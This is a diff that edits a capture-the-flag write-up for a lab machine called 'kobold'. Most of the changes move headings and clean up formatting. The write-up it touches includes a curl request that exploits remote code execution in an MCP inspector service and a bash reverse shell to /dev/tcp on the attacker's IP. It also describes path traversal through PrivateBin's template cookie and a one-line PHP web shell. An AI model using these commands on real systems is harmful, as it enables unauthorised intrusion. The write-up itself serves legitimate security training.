@@ -101,9 +101,7 @@ Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnera
 
 ### Exploitation
 
-Confirming the vulnerability with an outbound connection:
-
-shell
+Confirming the vulnerability with a callback request:
 
 ```shell
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
@@ -119,9 +117,13 @@ Host: 10.10.14.224:1111
 User-Agent: Wget/1.21.4
 ```
 
-The listener receives the request, confirming code execution. A reverse shell is obtained by staging a bash script and executing it via two subsequent requests:
+The listener receives the request, confirming code execution. 
 
-shell
+
+---
+## User Flag
+
+A reverse shell is obtained by uploading a bash script with the RCE vulnerability and executing it:
 
 ```shell
 cat shell.sh
@@ -130,8 +132,6 @@ bash -i >& /dev/tcp/10.10.14.224/1111 0>&1
 
 python3 -m http.server 8000
 ```
-
-shell
 
 ```shell
 # Stage the shell script on the target
@@ -152,17 +152,11 @@ ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
 uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
 ```
 
-Shell obtained as `ben`. Upgraded to a full interactive TTY:
-
-shell
+A shell is obtained as `ben`. Upgraded to a full interactive TTY:
 
 ```shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
-
----
-
-## User Flag
 
 ```
 ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /home/ben/user.txt
@@ -176,8 +170,6 @@ ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /home/ben/user.txt
 ### Enumeration
 
 Enumerating files owned by the `operator` group:
-
-shell
 
 ```shell
 ben@kobold:~$ find / -group operator 2>/dev/null
@@ -195,8 +187,6 @@ ben@kobold:~$ find / -group operator 2>/dev/null
 
 The `bd/b5` subdirectory is world-writable and falls within the PrivateBin data directory:
 
-shell
-
 ```shell
 ben@kobold:/privatebin-data/data/bd$ ls -la
 total 12
@@ -209,15 +199,11 @@ drwxrwxrwx 2 root operator 4096 Mar 15 21:23 b5
 
 PrivateBin's template selection feature uses a session cookie (`template`) to load a PHP template file from the `tpl/` directory. The path is not sanitized, allowing traversal into arbitrary directories. A PHP web shell dropped into `bd/b5/` can be loaded by pointing the cookie at that path.
 
-shell
-
 ```shell
 ben@kobold:/privatebin-data/data/bd/b5$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
 ```
 
 Verifying execution via curl:
-
-shell
 
 ```shell
 curl -k https://bin.kobold.htb/ \
